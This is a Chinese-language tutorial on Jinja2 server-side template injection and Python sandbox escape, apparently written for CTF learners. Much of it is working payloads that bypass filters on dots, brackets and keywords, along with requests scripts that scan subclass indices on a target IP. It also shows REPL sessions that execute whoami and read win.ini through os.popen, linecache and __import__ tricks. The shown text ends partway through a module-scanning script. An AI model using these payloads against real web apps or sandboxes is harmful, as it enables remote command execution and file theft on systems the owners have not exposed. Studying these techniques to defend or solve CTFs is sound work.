<h4 id="符号的过滤">符号的过滤</h4>
<pre><code class="hljs plaintext">访问变量属性： . [] getattribute

标准的python语法使用点（.）外，还可以使用中括号（[]）来访问变量的属性,也可以使用attr来访问变量的属性。</code></pre>
<h4 id="过滤了点号">过滤了点号</h4>
<pre><code class="hljs plaintext">{{().__class__ }}等同于{{()['__class__']}}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318161346546.png" alt="image-20230318161346546"></p>
<pre><code class="hljs plaintext">""|attr("__class__")
相当于
"".__class__</code></pre>
<h4 id="过滤了中括号">过滤了中括号</h4>
<p>还有一些其他的访问方法：pop get getitem:</p>
<pre><code class="hljs scss">{{url_for<span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span>}}
{{url_for<span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__getitem__</span>('__builtins__')}}
{{url_for<span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.pop</span>('__builtins__')}}
{{url_for<span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.get</span>('__builtins__')}}
{{url_for<span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.setdefault</span>('__builtins__')}}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318161452566.png" alt="image-20230318161452566"></p>
<pre><code class="hljs scss">{{""<span class="hljs-selector-class">.class</span>}}=={{""<span class="hljs-selector-attr">[[cla,ss]</span>|join]}}   <span class="hljs-comment">//这是拼接绕过</span>

"__cladd__"|<span class="hljs-built_in">replace</span>("dd","ss")     <span class="hljs-comment">// "__class__"   //这是替代</span>

“ssalc”<span class="hljs-selector-attr">[::-1]</span>
""<span class="hljs-selector-attr">[<span class="hljs-string">"__ssalc__"</span>]</span><span class="hljs-selector-attr">[::-1]</span>
""<span class="hljs-selector-class">.__getattribute__</span>("__ssalc__"[::-<span class="hljs-number">1</span>])    <span class="hljs-comment">//这是反转</span>

""<span class="hljs-selector-attr">[<span class="hljs-string">"__CLASS__"</span>.lower()]</span>     <span class="hljs-comment">//这是大小写转换</span>

"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"

对于python2的话，还可以利用base64进行绕过

"__class__"==("X19jbGFzc19f")<span class="hljs-selector-class">.decode</span>("base64")        <span class="hljs-comment">//这是编码绕过</span></code></pre>
<h3 id="28-脚本">2.8 脚本</h3>
<h4 id="1-寻找内建函数-eval-执行命令">1. 寻找内建函数 eval 执行命令</h4>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
}

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):
    url = <span class="hljs-string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">"].__init__.__globals__['__builtins__']}}"</span>

    res = requests.get(url=url, headers=headers)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'eval'</span> <span class="hljs-keyword">in</span> res.text:
        <span class="hljs-built_in">print</span>(i)

<span class="hljs-comment"># 得到一大堆子类的索引:</span></code></pre>
<pre><code class="hljs plaintext">我们可以记下几个含有eval函数的类：

warnings.catch_warnings
WarningMessage
codecs.IncrementalEncoder
codecs.IncrementalDecoder
codecs.StreamReaderWriter
os._wrap_close
reprlib.Repr
weakref.finalize
......</code></pre>
<h4 id="2-寻找-os-模块执行命令">2. 寻找 os 模块执行命令</h4>
<p>Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。</p>
<p>首先编写脚本遍历目标Python环境中含有os模块的类的索引号：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
}

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):
    url = <span class="hljs-string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">"].__init__.__globals__}}"</span>

    res = requests.get(url=url, headers=headers)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'os.py'</span> <span class="hljs-keyword">in</span> res.text:
        <span class="hljs-built_in">print</span>(i)

<span class="hljs-comment"># 可以得到一大堆类</span></code></pre>
<p>但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。</p>
<p>我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 <code>os._wrap_close</code>，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。</p>
<h4 id="3-寻找-popen-函数执行命令">3. 寻找 popen 函数执行命令</h4>
<p>首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
}

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):
    url = <span class="hljs-string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">"].__init__.__globals__}}"</span>

    res = requests.get(url=url, headers=headers)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'popen'</span> <span class="hljs-keyword">in</span> res.text:
        <span class="hljs-built_in">print</span>(i)

<span class="hljs-comment"># 得到编号为</span></code></pre>
<p>这样得到的索引还是很准确的。</p>
<p>除了这种方法外，我们还可以直接导入os模块，python有一个importlib类，可用load_module来导入你需要的模块。</p>
<h4 id="4-寻找-importlib-类执行命令">4. 寻找 importlib 类执行命令</h4>
<p>Python 中存在 <code>&lt;class '_frozen_importlib.BuiltinImporter'&gt;</code> 类，目的就是提供 Python 中 import 语句的实现（以及 <code>__import__</code> 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。</p>
<p>首先编写脚本遍历目标Python环境中 importlib 类的索引号：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
}

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):
    url = <span class="hljs-string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">"]}}"</span>

    res = requests.get(url=url, headers=headers)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'_frozen_importlib.BuiltinImporter'</span> <span class="hljs-keyword">in</span> res.text:
        <span class="hljs-built_in">print</span>(i)</code></pre>
<h4 id="5-寻找-linecache-函数执行命令">5. 寻找 linecache 函数执行命令</h4>
<p>linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。</p>
<p>首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
}

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):
    url = <span class="hljs-string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">"].__init__.__globals__}}"</span>

    res = requests.get(url=url, headers=headers)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'linecache'</span> <span class="hljs-keyword">in</span> res.text:
        <span class="hljs-built_in">print</span>(i)</code></pre>
<h4 id="6-寻找-subprocesspopen-类执行命令">6. 寻找 subprocess.Popen 类执行命令</h4>
<p>从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。</p>
<p>subprocess 意在替代其他几个老的模块或者函数，比如：<code>os.system</code>、<code>os.popen</code> 等函数。</p>
<p>首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

headers = {
    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
}

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):
    url = <span class="hljs-string">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">"]}}"</span>

    res = requests.get(url=url, headers=headers)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'linecache'</span> <span class="hljs-keyword">in</span> res.text:
        <span class="hljs-built_in">print</span>(i)</code></pre>
<h2 id="四-沙箱逃逸">四、沙箱逃逸</h2>
<h3 id="41-原理">4.1 原理</h3>
<p><strong>沙盒/沙箱</strong><br>
沙箱在早期主要用于测试可疑软件，测试病毒危害程度等等。在沙箱中运行，即使病毒对其造成了严重<br>
危害，也不会威胁到真实环境，沙箱重构也十分便捷。有点类似虚拟机的利用。</p>
<p>沙箱逃逸,就是在给我们的一个代码执行环境下,脱离种种过滤和限制,最终成功拿到shell权限的过程。其<br>
实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。而我们这里主要讲解的是python环境下的<br>
沙箱逃逸。</p>
<p>python的沙箱逃逸就是在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程。</p>
<p>既然是想getshell，或者说是执行命令就需要一个可执行命令的包。可直接执行命令的模块有</p>
<pre><code class="hljs plaintext">os
pty
subprocess
plarform
commands</code></pre>
<p>有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：</p>
<pre><code class="hljs none">file
open
codecs
fileinput</code></pre>
<p>不过其中file只在python2中执行，左2右3。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622200109232.png" alt="image-20230622200109232"></p>
<h3 id="42-函数导入限制和绕过">4.2 函数导入限制和绕过</h3>
<h4 id="1-import">1. import</h4>
<p>一个受限制的环境，禁止导入敏感的包是最常见的方法，所以import一般是最容易被限制掉。</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> re,sys
pattern  = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">'import\s+(os|subprocess)'</span>)
<span class="hljs-keyword">match</span> = re.search(pattern,sys.args[<span class="hljs-number">1</span>])
<span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:
    <span class="hljs-built_in">print</span> <span class="hljs-string">"forbidden module import detected"</span>
    <span class="hljs-keyword">raise</span> Exception</code></pre>
<p>这种简单的限制不能导入包的形式，可以中间添加空格来绕过，或者使用其他方式导入包，比如</p>
<pre><code class="hljs plaintext">__import__
importlib</code></pre>
<p>还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用</p>
<pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> base64
<span class="hljs-meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="hljs-string">"os"</span>)
<span class="hljs-string">'b3M='</span>
<span class="hljs-meta">&gt;&gt;&gt; </span>flag = <span class="hljs-built_in">__import__</span>(base64.b64decode(<span class="hljs-string">'b3M='</span>))
<span class="hljs-meta">&gt;&gt;&gt; </span>flag.system(<span class="hljs-string">'whoami'</span>)
misaki\user

或者
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> importlib
<span class="hljs-meta">&gt;&gt;&gt; </span>flag = importlib.import_module(<span class="hljs-string">'b3M='</span>.decode(<span class="hljs-string">'base64'</span>))
<span class="hljs-meta">&gt;&gt;&gt; </span>flag.system(<span class="hljs-string">'whoami'</span>)
misaki\user</code></pre>
<p>或者使用字符串拼接的方式</p>
<pre><code class="hljs none">&gt;&gt;&gt; __import__('o'+'s').system('who'+'ami')</code></pre>
<p>字符串f翻转截取</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; __import__('so'[::-1]).system('whoami')
misaki\user
&gt;&gt;&gt; exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
misaki\user</code></pre>
<p>再万一，他是这么禁止的</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> re,sys
pattern  = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">'import'</span>)
<span class="hljs-keyword">match</span> = re.search(pattern,sys.args[<span class="hljs-number">1</span>])
<span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:
    <span class="hljs-built_in">print</span> <span class="hljs-string">"forbidden module import detected"</span>
    <span class="hljs-keyword">raise</span> Exception</code></pre>
<p>这样的话，不管怎么换导入函数都会被禁止。那么是否有不直接使用import关键字来导入的方式。既然需要导入也就是只需要能执行对应的库就可以。</p>
<p>使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; execfile('/usr/lib/python2.7/os.py')  #Linux系统下默认路径
&gt;&gt;&gt; system('whoami')
misaki</code></pre>
<p>python3可以利用读取文件，配合exec来执行</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; f = open(r'/usr/lib/python3.6/os.py','r')
&gt;&gt;&gt; exec(f.read())
&gt;&gt;&gt; system('whoami')
misaki

#不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作
exec("open('/usr/lib/python3.6/os.py','r').read()")</code></pre>
<p>使用with open的形式</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; with open('/usr/lib/python3.6/os.py','r') as f:
...     exec(f.read())
...
&gt;&gt;&gt; system('whoami')
misaki</code></pre>
<p>或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; exec('imp'+'ort'+' '+'os;'+'os.system("whoami")')
misaki\user</code></pre>
<p>这里exec不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。</p>
<h4 id="2-builtins">2. builtins</h4>
<p>__builtins__即时引用，在程序还为执行代码的时候就已经加载进来了。此模块并不需要导入，可以在任何模块中执行引用。比如在python2中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622202711741.png" alt="image-20230622202711741"></p>
<p>在python3中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622202736333.png" alt="image-20230622202736333"></p>
<p>所以我们通过dict属性来调用这些函数，例如如下调用exec来执行其中的python语句。</p>
<pre><code class="hljs none">&gt;&gt;&gt; __builtins__.__dict__['exec']("print('ok')")
ok</code></pre>
<p>通过内建函数来导入包</p>
<pre><code class="hljs none">&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami')
misaki\user</code></pre>
<p>万一跟上面一样，禁用了import，当然还可以使用拼接的方式</p>
<pre><code class="hljs none">&gt;&gt;&gt; __builtins__.__dict__['__imp'+'ort__']('os').system('whoami')
misaki\user</code></pre>
<p>如果在__builtins__中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载</p>
<pre><code class="hljs none">reload(__builtin__)</code></pre>
<p>如果仔细看上面的图片就可以看到，在python2中reload也是__builtin__的内建函数。如果此函数被删除在python2中也不可以直接引用了。python3中reload不再是内建函数，3.4之前是imp模块下的函数，而之后是importlib模块下的函数。</p>
<p>所以可以直接利用imp模块来导入，python2也可以利用。</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; import imp
&gt;&gt;&gt; imp.reload(__builtins__)
&lt;module '__builtin__' (built-in)&gt;</code></pre>
<p>在所上的导入模块中，系统的包都在一个默认路径下，被sys的modules存储记录。如果把其中的os模块删除就不能再去加载os模块了，这时候需要手动把os重新加载进去。一般尝试默认路径，或者sys查看存储路径</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules['os']='/usr/lib/python3.6/os.py'
&gt;&gt;&gt; import os</code></pre>
<h4 id="3-魔法函数">3. 魔法函数</h4>
<p>python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。</p>
<p>先看看几个常用的魔法函数</p>
<pre><code class="hljs python">__class__
返回调用的类型
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():
	<span class="hljs-keyword">pass</span>
	
a = A()
<span class="hljs-built_in">print</span>(a.__class__)  <span class="hljs-comment">#&lt;class '__main__.A'&gt;</span></code></pre>
<pre><code class="hljs python">__mro__
查看类继承的所有父类，直到<span class="hljs-built_in">object</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
	<span class="hljs-keyword">pass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>(<span class="hljs-title class_ inherited__">A</span>):
	<span class="hljs-keyword">pass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span>(<span class="hljs-title class_ inherited__">A</span>):
	<span class="hljs-keyword">pass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">D</span>(B, C):
	<span class="hljs-keyword">pass</span>
<span class="hljs-built_in">print</span>(D.__mro__) <span class="hljs-comment">#(&lt;class '__main__.D'&gt;, &lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class 'object'&gt;)</span></code></pre>
<pre><code class="hljs python">__subclasses__
获取类的所有子类
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">pass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>(<span class="hljs-title class_ inherited__">A</span>):
    <span class="hljs-keyword">pass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span>(<span class="hljs-title class_ inherited__">A</span>):
    <span class="hljs-keyword">pass</span>
    
<span class="hljs-built_in">print</span>(A.__subclasses__()) <span class="hljs-comment">#[&lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;]</span></code></pre>
<pre><code class="hljs python">__bases__
返回所有直接父类组成的元组
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):
	<span class="hljs-keyword">pass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>(<span class="hljs-title class_ inherited__">A</span>):
	<span class="hljs-keyword">pass</span>
	
<span class="hljs-built_in">print</span>(B.__bases__)  <span class="hljs-comment">#(&lt;class '__main__.A'&gt;,)  不返回object类</span></code></pre>
<pre><code class="hljs python">__init__
类实例创建之后调用, 对当前对象的实例的一些初始化
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'ok'</span>)
         
a = A()  <span class="hljs-comment"># 输出ok</span></code></pre>
<pre><code class="hljs python">__globals__
能够返回函数所在模块命名空间的所有变量
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):
	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b</span>):
		self.a = a
		self.b = b
a.__init__.__globals__
{<span class="hljs-string">'A'</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'__main__.A'</span>&gt;, <span class="hljs-string">'a'</span>: &lt;__main__.A <span class="hljs-built_in">object</span> at <span class="hljs-number">0x0000000001692390</span>&gt;, <span class="hljs-string">'importlib'</span>: &lt;module <span class="hljs-string">'importlib'</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'D:\anaconda\lib\importlib\__init__.pyc'</span>&gt;, <span class="hljs-string">'__builtins__'</span>: &lt;module <span class="hljs-string">'__builtin__'</span> (built-<span class="hljs-keyword">in</span>)&gt;, <span class="hljs-string">'pattern'</span>: &lt;_sre.SRE_Pattern <span class="hljs-built_in">object</span> at <span class="hljs-number">0x0000000001695030</span>&gt;, <span class="hljs-string">'base64'</span>: &lt;module <span class="hljs-string">'base64'</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'D:\anaconda\lib\base64.pyc'</span>&gt;, <span class="hljs-string">'sys'</span>: &lt;module <span class="hljs-string">'sys'</span> (built-<span class="hljs-keyword">in</span>)&gt;, <span class="hljs-string">'flag'</span>: &lt;module <span class="hljs-string">'os'</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'D:\anaconda\lib\os.pyc'</span>&gt;, <span class="hljs-string">'__package__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'os'</span>: &lt;module <span class="hljs-string">'os'</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'D:\anaconda\lib\os.pyc'</span>&gt;,<span class="hljs-string">'__doc__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'match'</span>: &lt;_sre.SRE_Match <span class="hljs-built_in">object</span> at <span class="hljs-number">0x00000000039A9B28</span>&gt;}</code></pre>
<pre><code class="hljs python">__getattribute__
当类被调用的时候，无条件进入此函数。
__getattr__
对象中不存在的属性时调用
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.name = <span class="hljs-string">"Bob"</span>
	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattribute__</span>(<span class="hljs-params">self,item</span>):
		<span class="hljs-built_in">print</span>(<span class="hljs-string">"ok"</span>)
a = A()  
a.name   <span class="hljs-comment">#ok, 这时候不管调用什么属性都会返回ok，相当于拦截了属性调用。</span>
	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self</span>):
		<span class="hljs-built_in">print</span>(<span class="hljs-string">'getattr'</span>)
a.age   <span class="hljs-comment">#getattr  调用不存在的属性会执行，相当于处理了AttributeError。</span></code></pre>
<h4 id="4-类继承使用">4. 类继承使用</h4>
<p>尝试利用继承关系来找到object类</p>
<pre><code class="hljs none">"".__class__.__bases__   #(&lt;class 'object'&gt;,)</code></pre>
<p>前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。</p>
<pre><code class="hljs none">[].__class__.__bases__
{}.__class__.__bases__</code></pre>
<p>在object类下去查找所有的子类，然后去查找可利用类，__bases__返回是元组，使用下标获得object类。</p>
<pre><code class="hljs none">"".__class__.__bases__[0].__subclasses__()</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622204430106.png" alt="image-20230622204430106"></p>
<p>找到需要使用的类，其中有可以使用的类，在python3中使用</p>
<pre><code class="hljs none">&lt;class 'os._wrap_close'&gt;,&lt;class 'warnings.WarningMessage'&gt;</code></pre>
<p>调用他们</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[128]
&lt;class 'os._wrap_close'&gt;

&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[177]
&lt;class 'warnings.WarningMessage'&gt;</code></pre>
<p>如果子类过多，不好查找是第几个下标，可以使用如下来标记</p>
<pre><code class="hljs none">for i in enumerate("".__class__.__bases__[0].__subclasses__()):
	print i</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622204534944.png" alt="image-20230622204534944"></p>
<p>先来读取一下文件，C盘下的win.ini文件</p>
<pre><code class="hljs none">"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622204612746.png" alt="image-20230622204612746"></p>
<p>从中查找是否有关于文件读取的方法，比如open，file函数。在最后找到一个popen函数。</p>
<pre><code class="hljs none">"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']("C:\\windows\\win.ini").read()

#如果这里会报错添加__builtins__
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.__builtins__['popen']("C:\\windows\\win.ini").read()</code></pre>
<p>如果想直接在终端显示出来</p>
<pre><code class="hljs none">"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']("type C:\\windows\\win.ini").read()</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622204914438.png" alt="image-20230622204914438"></p>
<p>在python2中可以使用如下形式读取文件的第一行，在python2中前面是否字符串还是元组或者字典对后面类的查找有不一样的结果。</p>
<pre><code class="hljs none">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].getline("C:\\windows\\win.ini",1)</code></pre>
<p>执行命令</p>
<pre><code class="hljs none">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].os.system('whoami'
)misaki\user</code></pre>
<p>但是python2如果使用字符串的形式，会报如下错误，因为<code>__bases__</code>获取的并不是object类</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[59]
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
IndexError: list index out of range</code></pre>
<p>只需要再去获得一次即可</p>
<pre><code class="hljs none">&gt;&gt;&gt; "".__class__.__bases__[0].__bases__[0].__subclasses__()[59]
&lt;class 'warnings.WarningMessage'&gt;</code></pre>
<h4 id="5-特殊函数查找">5. 特殊函数查找</h4>
<h5 id="51-python3">5.1 python3</h5>
<p>在GitHub的python页面上把自带函数全部获取目前的3.8的模块(202)</p>
<pre><code class="hljs plaintext">asyncio
collections
concurrent
ctypes
curses
dbm
distutils
email
encodings
......
warnings.py
wave.py
weakref.py
webbrowser.py
xdrlib.py
zipapp.py
zipfile.py
zipimport.py</code></pre>
<p>将这么模块进行筛选，规则这些模块哪些有调用上面提到的模块，或者文件读取等方法。</p>
<pre><code class="hljs python"><span class="hljs-comment"># coding=UTF-8</span>
<span class="hljs-keyword">import</span> codecs
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict
<span class="hljs-keyword">with</span> codecs.<span class="hljs-built_in">open</span>(<span class="hljs-string">'python.txt'</span>, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'UTF-8'</span>) <span class="hljs-keyword">as</span> f:
    modules = f.readlines()
modules = [m.strip().replace(<span class="hljs-string">'.py'</span>, <span class="hljs-string">''</span>) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> modules]
target_modules = [<span class="hljs-string">'os'</span>, <span class="hljs-string">'platform'</span>, <span class="hljs-string">'subprocess'</span>, <span class="hljs-string">'timeit'</span>, <span class="hljs-string">'importlib'</span>, <span class="hljs-string">'codecs'</span>, <span class="hljs-string">'sys'</span>, <span class="hljs-string">'commands'</span>]
